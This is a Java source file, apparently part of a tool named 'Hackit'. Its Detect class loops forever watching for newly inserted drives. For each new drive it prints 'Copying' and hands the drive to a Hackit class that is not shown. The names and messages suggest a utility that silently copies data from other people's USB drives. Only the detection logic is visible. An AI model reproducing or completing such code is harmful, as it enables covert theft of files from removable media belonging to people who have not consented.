
package hckit_att2;

import java.io.File;

public class Detect {
    
    public Detect()
    {
        File of[]=File.listRoots();
        while(true)
        {
          File nf[]=File.listRoots();
          check(of,nf);
          of=nf;
        }
    }
   public void check(File of[],File nf[])
    {
        int nl=nf.length;
        int ol=of.length;
        if(nl>ol) // insert
        {
           for(int i=0;i<nl;i++)
           {
               int flag=0;
               for(int j=0;j<ol;j++)
               {
                  if(nf[i].equals(of[j])) 
                  {
                      flag=1;
                      break;
                  }   
               }
               if(flag==0)
               {
                  System.out.println(nf[i].toString()+ "injected");
                  if(nf[i].isDirectory()){
                  System.out.println("Copying "+nf[i].toString());
                  new Hackit(nf[i]); 
                  }
               }
           }
        }
        else if(nl<ol)
        {
           for(int i=0;i<ol;i++)
           {
               int flag=0;
               for(int j=0;j<nl;j++)
               {
                  if(of[i].equals(nf[j])) 
                  {
                      flag=1;
                      break;
                  }   
               }
               if(flag==0)
               {
                  System.out.println(of[i].toString() + "ejected");
               }
           }
        }
    }
   public static void main(String args[])
   {
       new Detect();
   }
    
}
